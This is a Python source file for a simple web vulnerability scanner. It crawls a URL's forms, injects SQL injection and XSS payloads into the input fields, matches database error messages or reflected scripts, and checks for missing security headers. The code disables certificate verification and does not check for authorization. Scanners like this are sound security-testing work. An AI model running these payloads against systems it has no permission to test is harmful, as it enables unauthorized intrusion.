import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import re
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─────────────────────────────────────────
# SQL Injection payloads
# ─────────────────────────────────────────
SQLI_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "\" OR \"1\"=\"1",
    "1' ORDER BY 1--",
    "1' UNION SELECT NULL--",
]

SQLI_ERROR_PATTERNS = [
    r"you have an error in your sql syntax",
    r"warning: mysql",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"sql syntax.*mysql",
    r"syntax error.*postgresql",
    r"microsoft ole db provider for sql server",
    r"odbc sql server driver",
    r"ora-\d{5}",
    r"sqlite_error",
]

# ─────────────────────────────────────────
# XSS payloads
# ─────────────────────────────────────────
XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert('xss')>",
    "'\"><script>alert(1)</script>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert('xss')>",
    "\"><img src=x onerror=alert(1)>",
]

# ─────────────────────────────────────────
# Extract Forms
# ─────────────────────────────────────────
def get_forms(url):
    try:
        response = requests.get(url, timeout=10, verify=False)
        soup = BeautifulSoup(response.content, "html.parser")
        return soup.find_all("form")
    except:
        return []

# ─────────────────────────────────────────
# Form Details
# ─────────────────────────────────────────
def get_form_details(form):
    details = {}
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()

    inputs = []
    for tag in form.find_all("input"):
        input_type = tag.attrs.get("type", "text")
        input_name = tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})

    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

# ─────────────────────────────────────────
# Submit Form
# ─────────────────────────────────────────
def submit_form(form_details, url, payload):
    target_url = urljoin(url, form_details["action"])
    data = {}

    for input_field in form_details["inputs"]:
        if input_field["type"] in ("text", "search", "email", "password", "hidden"):
            data[input_field["name"]] = payload
        elif input_field["name"]:
            data[input_field["name"]] = "test"

    try:
        if form_details["method"] == "post":
            return requests.post(target_url, data=data, timeout=10, verify=False)
        else:
            return requests.get(target_url, params=data, timeout=10, verify=False)
    except:
        return None

# ─────────────────────────────────────────
# SQL Injection Scanner
# ─────────────────────────────────────────
def scan_sqli(url):
    findings = []
    forms = get_forms(url)

    for form in forms:
        details = get_form_details(form)
        for payload in SQLI_PAYLOADS:
            response = submit_form(details, url, payload)
            if response is None:
                continue

            for pattern in SQLI_ERROR_PATTERNS:
                if re.search(pattern, response.text.lower()):
                    findings.append({
                        "type": "SQL Injection",
                        "severity": "HIGH",
                        "payload": payload,
                        "form_action": details["action"],
                        "evidence": f"Error pattern matched: {pattern}",
                    })
                    break

    return findings

# ─────────────────────────────────────────
# XSS Scanner
# ─────────────────────────────────────────
def scan_xss(url):
    findings = []
    forms = get_forms(url)

    for form in forms:
        details = get_form_details(form)
        for payload in XSS_PAYLOADS:
            response = submit_form(details, url, payload)
            if response and payload in response.text:
                findings.append({
                    "type": "Cross-Site Scripting (XSS)",
                    "severity": "HIGH",
                    "payload": payload,
                    "form_action": details["action"],
                    "evidence": "Payload reflected in response body",
                })

    return findings

# ─────────────────────────────────────────
# NEW: Security Headers Scanner
# ─────────────────────────────────────────
def scan_headers(url):
    findings = []
    try:
        response = requests.get(url, timeout=10, verify=False)
        headers = response.headers

        security_headers = {
            "Content-Security-Policy": "Missing CSP (Prevents XSS)",
            "Strict-Transport-Security": "Missing HSTS (Forces HTTPS)",
            "X-Frame-Options": "Missing X-Frame-Options (Prevents Clickjacking)",
            "X-Content-Type-Options": "Missing X-Content-Type-Options"
        }

        for header, desc in security_headers.items():
            if header not in headers:
                findings.append({
                    "type": "Missing Security Header",
                    "severity": "LOW",
                    "description": desc,
                    "header": header
                })
    except:
        pass

    return findings

# ─────────────────────────────────────────
# MAIN SCAN FUNCTION
# ─────────────────────────────────────────
def run_scan(url):
    results = {
        "url": url,
        "sqli": [],
        "xss": [],
        "headers": [],
        "summary": {},
        "risk_score": 0,
        "error": None,
    }

    parsed = urlparse(url)
    if not parsed.scheme or not parsed.netloc:
        results["error"] = "Invalid URL. Include http:// or https://"
        return results

    try:
        requests.get(url, timeout=5, verify=False)
    except Exception as e:
        results["error"] = f"Cannot reach URL: {str(e)}"
        return results

    # Run all scans
    results["sqli"] = scan_sqli(url)
    results["xss"] = scan_xss(url)
    results["headers"] = scan_headers(url)

    # Summary
    results["summary"] = {
        "total": len(results["sqli"]) + len(results["xss"]) + len(results["headers"]),
        "sqli_count": len(results["sqli"]),
        "xss_count": len(results["xss"]),
        "header_count": len(results["headers"]),
        "risk_level": "HIGH" if results["sqli"] or results["xss"] else "LOW"
    }

    # Risk Score Calculation
    results["risk_score"] = (
        (len(results["sqli"]) * 10) +
        (len(results["xss"]) * 5) +
        (len(results["headers"]) * 1)
    )

    return results